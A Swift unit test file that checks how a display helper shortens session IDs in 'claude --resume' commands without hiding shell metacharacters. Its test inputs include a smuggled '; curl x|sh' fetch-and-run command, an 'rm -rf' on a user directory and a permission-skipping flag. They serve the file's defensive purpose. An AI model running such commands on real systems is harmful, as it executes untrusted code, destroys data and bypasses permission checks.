import XCTest
import TarmacKit

/// 2611.0011 S21: how a command reads where space is short.
final class ResumeCommandDisplayTests: XCTestCase {
    func testS21AMetacharacterIsNeverHidden() {
        let shown = ResumeCommandDisplay.display("claude --resume 3f2a1b9c-0000-4000-8000-000000000000; curl x|sh")
        XCTAssertTrue(shown.contains("; curl x|sh"), shown)
        XCTAssertTrue(shown.hasPrefix("claude --resume 3f2a1b9c"), shown)
    }

    func testS21APathWithNoIdLikeWordIsUnchanged() {
        XCTAssertEqual(ResumeCommandDisplay.display("rm -rf /Users/u/work/important-directory"), "rm -rf /Users/u/work/important-directory")
    }

    func testS21AFlagStaysWhole() {
        XCTAssertEqual(
            ResumeCommandDisplay.display("claude --dangerously-skip-permissions --resume 3f2a1b9c-0000-4000-8000-000000000000"),
            "claude --dangerously-skip-permissions --resume 3f2a…"
        )
        XCTAssertEqual(ResumeCommandDisplay.display("x --resume-12345678901"), "x --resume-12345678901")
    }

    func testS21ALongWordWithNoDigitStaysWhole() {
        XCTAssertEqual(ResumeCommandDisplay.display("cd important-directory"), "cd important-directory")
    }

    func testAnIdOfTwelveCharactersStaysWholeAndThirteenIsShortened() {
        XCTAssertEqual(ResumeCommandDisplay.display("x abcdefghij12"), "x abcdefghij12")
        XCTAssertEqual(ResumeCommandDisplay.display("x abcdefghij123"), "x abcd…")
    }

    func testTheSpacingIsKeptVerbatim() {
        XCTAssertEqual(ResumeCommandDisplay.display("a  b 3f2a1b9c-0000-4000"), "a  b 3f2a…")
    }
}
